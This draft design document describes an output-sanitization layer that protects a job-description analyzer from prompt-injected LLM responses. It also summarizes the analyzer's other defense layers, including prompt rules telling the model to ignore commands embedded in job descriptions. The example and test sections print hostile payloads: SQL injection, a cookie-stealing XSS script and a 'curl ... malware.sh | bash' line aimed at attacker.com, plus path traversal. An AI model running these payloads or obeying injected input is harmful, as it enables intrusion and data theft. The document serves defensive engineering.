---
title: "Response Sanitization Layer"
type: technical_doc
component: general
status: draft
tags: []
---

# Response Sanitization Layer - Defense Layer 6
**Final Safeguard Against Malicious LLM Outputs**

---

## Overview

The response sanitization layer is the **LAST line of defense** if all other security layers fail. It sanitizes LLM response data before database storage to prevent malicious payloads from persisting in the system.

**Purpose:** Even if prompt injection succeeds and bypasses all defenses, this layer prevents malicious data from:
- SQL injection (though we use parameterized queries)
- XSS attacks (sanitizes HTML/JS in text fields)
- Command injection (strips shell metacharacters)
- Path traversal (sanitizes file paths)
- Data exfiltration (detects and blocks suspicious URLs)

---

## Defense-in-Depth Architecture

### Complete Security Stack

**Layer 1: Input Sanitization** (`ai_analyzer.py:58-100`)
- Pre-LLM scanning for injection patterns
- Unpunctuated text stream detection
- Logs suspicious job descriptions

**Layer 2: Prompt-Embedded Security Tokens** (All tier prompts)
- Security tokens throughout prompts (~12 mentions)
- Meta-instructions to ignore job description commands
- Instructs LLM to reject manipulation attempts

**Layer 3: Round-Trip Token Validation** (`ai_analyzer.py:1129-1146`)
- LLM must echo security token in response
- Proves authentic prompt was processed
- Logs token mismatches as security incidents

**Layer 4: Hash-and-Replace Prompt Protection** (`ai_analyzer.py:667-683`)
- Validates prompt hash before use
- Auto-replaces if agent tampering detected
- Allows user modifications with hash update

**Layer 5: Output Structure Validation** (`ai_analyzer.py:1174-1216`)
- JSON structure validation
- Required field checking
- Data type validation
- Business logic validation

**Layer 6: Response Sanitization** ⭐ **THIS LAYER** (`ai_analyzer.py:1154-1167`)
- Sanitizes all string fields recursively
- Detects and removes malicious patterns
- Logs all sanitization actions
- Final safeguard before database storage

---

## What Gets Sanitized

### 1. SQL Injection Patterns

**Detected Patterns:**
```
- UNION SELECT
- DROP TABLE
- DELETE FROM
- INSERT INTO
- UPDATE ... SET
- EXEC(...)
- xp_cmdshell
- SQL comments (-- and /* */)
```

**Action:** Replaced with `[REMOVED]`

**Example:**
```json
// Input:
{
  "skill_name": "Python'; DROP TABLE jobs; --"
}

// Output (sanitized):
{
  "skill_name": "Python[REMOVED] [REMOVED]"
}

// Warning logged:
"skill_name: SQL injection pattern detected: drop\\s+table - STRIPPED"
```

### 2. Command Injection Patterns

**Detected Patterns:**
```
- Shell metacharacters: ; & | ` $ ( )
- Command substitution: $(...)
- Backticks: `command`
- Output redirection: > /path
```

**Action:** Stripped from string

**Example:**
```json
// Input:
{
  "company_name": "TechCorp; rm -rf /"
}

// Output (sanitized):
{
  "company_name": "TechCorp rm -rf /"
}

// Warning logged:
"company_name: Command injection pattern detected - STRIPPED"
```

### 3. XSS (Cross-Site Scripting) Patterns

**Detected Patterns:**
```
- <script>...</script>
- javascript:
- Event handlers: onclick=, onerror=
- <iframe>, <embed>, <object>
```

**Action:** HTML-escaped

**Example:**
```json
// Input:
{
  "job_description": "Great job! <script>alert('xss')</script>"
}

// Output (sanitized):
{
  "job_description": "Great job! &lt;script&gt;alert('xss')&lt;/script&gt;"
}

// Warning logged:
"job_description: XSS pattern detected - ESCAPED"
```

### 4. Path Traversal Patterns

**Detected Patterns:**
```
- ../ (parent directory)
- .. (relative path)
- %2e%2e (URL-encoded ..)
- ..\ (Windows path traversal)
```

**Action:** Stripped from string

**Example:**
```json
// Input:
{
  "company_location": "../../etc/passwd"
}

// Output (sanitized):
{
  "company_location": "etc/passwd"
}

// Warning logged:
"company_location: Path traversal pattern detected - STRIPPED"
```

### 5. Unauthorized URL Detection

**URL-Prohibited Fields:**
These fields should NEVER contain URLs:
- `skill_name`
- `industry`
- `sub_industry`
- `job_function`
- `seniority_level`
- `job_title`
- `company_name`
- `department`

**Action:** URLs replaced with `[URL_REMOVED]`

**Example:**
```json
// Input:
{
  "skill_name": "Python https://attacker.com/exfil"
}

// Output (sanitized):
{
  "skill_name": "Python [URL_REMOVED]"
}

// Warning logged:
"skill_name: Unauthorized URL detected in prohibited field - STRIPPED"
```

### 6. Suspicious URL Detection

**URL-Allowed Fields** (but validated):
- `application_link`
- `application_email`
- `company_website`

**Suspicious Patterns:**
```
- Raw IP addresses: http://192.168.1.1
- Tunneling services: ngrok.io, localtunnel.me
- Dynamic DNS: duckdns.org, no-ip.org
- Localhost/internal IPs
- Private IP ranges (10.x, 172.16.x, 192.168.x)
```

**Action:** Replaced with `[SUSPICIOUS_URL_REMOVED]`

**Example:**
```json
// Input:
{
  "application_link": "https://192.168.1.1/jobs"
}

// Output (sanitized):
{
  "application_link": "[SUSPICIOUS_URL_REMOVED]/jobs"
}

// Warning logged:
"application_link: Suspicious URL detected: https://192.168.1.1 - STRIPPED"
```

### 7. Additional Protections

**Length Limits:**
- Max string length: 10,000 characters
- Prevents DoS via huge strings

**Null Byte Injection:**
- Strips `\x00` characters
- Prevents string termination exploits

**Unicode Control Characters:**
- Strips control characters (0x00-0x1F, 0x7F-0x9F)
- Prevents filter bypassing

---

## Integration Points

### 1. In Response Parsing (`ai_analyzer.py:1154-1167`)

```python
# SECURITY: Sanitize response before database storage (Layer 6 defense)
sanitized_result, warnings = self._sanitize_response(result)

# Add metadata
sanitized_result["analysis_timestamp"] = datetime.now().isoformat()
sanitized_result["model_used"] = "gemini-1.5-flash-latest"
sanitized_result["analysis_version"] = "1.0"

# Log security warnings if any
if warnings:
    sanitized_result["security_warnings"] = len(warnings)
    self._log_sanitization_warnings(result.get("job_id"), warnings)

validated_results.append(sanitized_result)
```

### 2. Sanitization Module (`response_sanitizer.py`)

**Main Functions:**
- `sanitize_response(result, job_id)` - Convenience function
- `ResponseSanitizer.sanitize_analysis_result()` - Full sanitization
- `ResponseSanitizer._sanitize_field()` - Recursive field sanitization
- `ResponseSanitizer._sanitize_string()` - String-specific checks

**Usage:**
```python
from modules.ai_job_description_analysis.response_sanitizer import sanitize_response

# Sanitize LLM response
sanitized_result, warnings = sanitize_response(raw_result, job_id)

if warnings:
    print(f"Found {len(warnings)} security issues")
    for warning in warnings:
        print(f"  - {warning}")
```

---

## Logging & Monitoring

### Sanitization Log (`storage/response_sanitization.jsonl`)

**Created:** On first sanitization warning
**Format:** JSONL (one entry per line)

**Example Entry:**
```json
{
  "timestamp": "2025-10-13T15:30:45.123456",
  "job_id": "job_12345",
  "model": "gemini-2.0-flash",
  "total_warnings": 3,
  "sql_injection_attempts": 1,
  "command_injection_attempts": 1,
  "xss_attempts": 0,
  "path_traversal_attempts": 0,
  "suspicious_urls": 1,
  "unauthorized_urls": 0,
  "sample_warnings": [
    "skill_name: SQL injection pattern detected: drop\\s+table - STRIPPED",
    "company_name: Command injection pattern detected - STRIPPED",
    "application_link: Suspicious URL detected: https://192.168.1.1 - STRIPPED"
  ]
}
```

### Monitoring Commands

**View recent sanitization warnings:**
```bash
tail -20 storage/response_sanitization.jsonl | jq .
```

**Count warnings by type:**
```bash
jq -s 'map({
  sql: .sql_injection_attempts,
  cmd: .command_injection_attempts,
  xss: .xss_attempts,
  urls: .suspicious_urls
}) | add' storage/response_sanitization.jsonl
```

**Filter by job:**
```bash
grep "job_12345" storage/response_sanitization.jsonl | jq .
```

**Alert on high-severity issues:**
```bash
# Jobs with > 5 warnings (potential attack)
jq 'select(.total_warnings > 5)' storage/response_sanitization.jsonl
```

---

## Attack Scenarios & Protection

### Scenario 1: SQL Injection Attempt

**Attack Vector:** Malicious job description with SQL injection
```
Job Title: Senior Developer'; DROP TABLE users; --
```

**Defense Layers:**
1. Layer 1: Input sanitization detects `DROP TABLE` pattern → Logs warning
2. Layer 2: Prompt instructs LLM to ignore meta-instructions → LLM likely refuses
3. Layer 3: Round-trip token validation → Ensures authentic prompt processed
4. Layer 5: Structure validation → Checks required fields present
5. **Layer 6: Response sanitization** → Strips `DROP TABLE` → Replaces with `[REMOVED]`

**Result:**
```json
{
  "job_title": "Senior Developer[REMOVED] [REMOVED]"
}
```
✅ **Database protected** - Malicious SQL never reaches database

---

### Scenario 2: XSS via Job Description

**Attack Vector:** XSS payload in job description
```
Job Description: Great opportunity! <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
```

**Defense Layers:**
1. Layer 1: Input sanitization detects `<script>` → Logs warning
2. Layer 2: Prompt instructs LLM to extract data, not execute code
3. Layer 3: Token validation passes (LLM processed authentic prompt)
4. Layer 5: Structure validation passes (valid JSON)
5. **Layer 6: Response sanitization** → Escapes HTML → `&lt;script&gt;...&lt;/script&gt;`

**Result:**
```json
{
  "job_description": "Great opportunity! &lt;script&gt;fetch(...)&lt;/script&gt;"
}
```
✅ **XSS prevented** - Payload rendered as plain text, not executed

---

### Scenario 3: Data Exfiltration via URL

**Attack Vector:** Suspicious URL in skill name
```
Skill Required: Python https://attacker.com/exfil?data=secrets
```

**Defense Layers:**
1. Layer 1: Input passes (no obvious injection pattern)
2. Layer 2: Prompt processes normally
3. Layer 3: Token validation passes
4. Layer 5: Structure validation passes
5. **Layer 6: Response sanitization** → Detects unauthorized URL → Strips it

**Result:**
```json
{
  "skill_name": "Python [URL_REMOVED]"
}
```
✅ **Data exfiltration blocked** - URL removed before database storage

---

### Scenario 4: Command Injection

**Attack Vector:** Shell metacharacters in company name
```
Company: TechCorp; curl http://attacker.com/malware.sh | bash
```

**Defense Layers:**
1. Layer 1: Input sanitization detects shell metacharacters → Logs warning
2. Layer 2: Prompt instructs LLM to extract data only
3. Layer 3: Token validation passes
4. Layer 5: Structure validation passes
5. **Layer 6: Response sanitization** → Strips shell metacharacters

**Result:**
```json
{
  "company_name": "TechCorp curl http://attacker.com/malware.sh  bash"
}
```
✅ **Command injection prevented** - Metacharacters stripped

---

## Performance Impact

**Measured Overhead:**
- Sanitization per field: ~0.5-2ms
- Sanitization per job (avg 50 fields): ~25-100ms
- Total overhead per batch (10 jobs): ~250ms-1s

**Optimizations:**
- Compiled regex patterns (reused across calls)
- Early exit on clean data (no warnings)
- Recursive algorithm (handles nested objects efficiently)

**Benchmark Command:**
```python
import time
from modules.ai_job_description_analysis.response_sanitizer import sanitize_response

start = time.time()
sanitized, warnings = sanitize_response(result, job_id)
elapsed = (time.time() - start) * 1000
print(f"Sanitization took: {elapsed:.2f}ms")
```

---

## Configuration

### Adjusting Limits

**File:** `response_sanitizer.py`

```python
# Maximum safe string length (prevent DoS)
self.max_string_length = 10000  # Increase if needed

# Add custom suspicious URL patterns
self.suspicious_url_patterns.append(r"https?://[a-z0-9-]+\.evil\.com")

# Add custom SQL injection patterns
self.sql_injection_patterns.append(r"(?i)(your_custom_pattern)")
```

### Disabling Specific Checks

```python
# Disable URL checking for a specific field
self.url_prohibited_fields.remove("company_name")

# Allow a specific domain
def _is_suspicious_url(self, url):
    if "trusted-domain.com" in url:
        return False  # Allow this domain
    # ... rest of checks
```

---

## Testing

### Unit Tests

**File:** `tests/test_response_sanitizer.py` (to be created)

```python
def test_sql_injection_detection():
    sanitizer = get_sanitizer()
    result = {"skill_name": "Python'; DROP TABLE jobs; --"}

    sanitized, warnings = sanitizer.sanitize_analysis_result(result, "test")

    assert "[REMOVED]" in sanitized["skill_name"]
    assert len(warnings) > 0
    assert "SQL injection" in warnings[0]

def test_xss_detection():
    sanitizer = get_sanitizer()
    result = {"job_description": "<script>alert('xss')</script>"}

    sanitized, warnings = sanitizer.sanitize_analysis_result(result, "test")

    assert "&lt;script&gt;" in sanitized["job_description"]
    assert "XSS" in warnings[0]

def test_unauthorized_url_detection():
    sanitizer = get_sanitizer()
    result = {"skill_name": "Python https://attacker.com"}

    sanitized, warnings = sanitizer.sanitize_analysis_result(result, "test")

    assert "[URL_REMOVED]" in sanitized["skill_name"]
    assert "Unauthorized URL" in warnings[0]
```

### Manual Testing

```bash
# Create test script
python tools/test_response_sanitization.py
```

---

## Maintenance

### Regular Reviews

**Weekly:**
- Review `storage/response_sanitization.jsonl` for patterns
- Identify new attack vectors
- Update sanitization rules

**Monthly:**
- Audit sanitization effectiveness
- Review false positives
- Optimize performance if needed

**Quarterly:**
- Full security review of sanitization logic
- Update patterns based on new threats
- Benchmark performance

### Adding New Patterns

When adding new malicious patterns:

1. **Identify pattern** from security logs
2. **Add to appropriate list** in `response_sanitizer.py`
3. **Write test case** in `tests/test_response_sanitizer.py`
4. **Document in this file** under "What Gets Sanitized"
5. **Deploy and monitor** for false positives

---

## Related Documentation

- **Prompt Protection:** `docs/prompt-protection-reference.md`
- **Round-Trip Validation:** `docs/round-trip-token-validation.md`
- **Security Manager:** `modules/ai_job_description_analysis/prompt_security_manager.py`
- **Input Sanitization:** `ai_analyzer.py:58-100` (`sanitize_job_description()`)

---

**Status:** ✅ Implemented (2025-10-13)
**Performance Impact:** ~250ms-1s per batch (10 jobs)
**Storage:** `storage/response_sanitization.jsonl`
**Next Review:** 2025-11-13 (1 month)
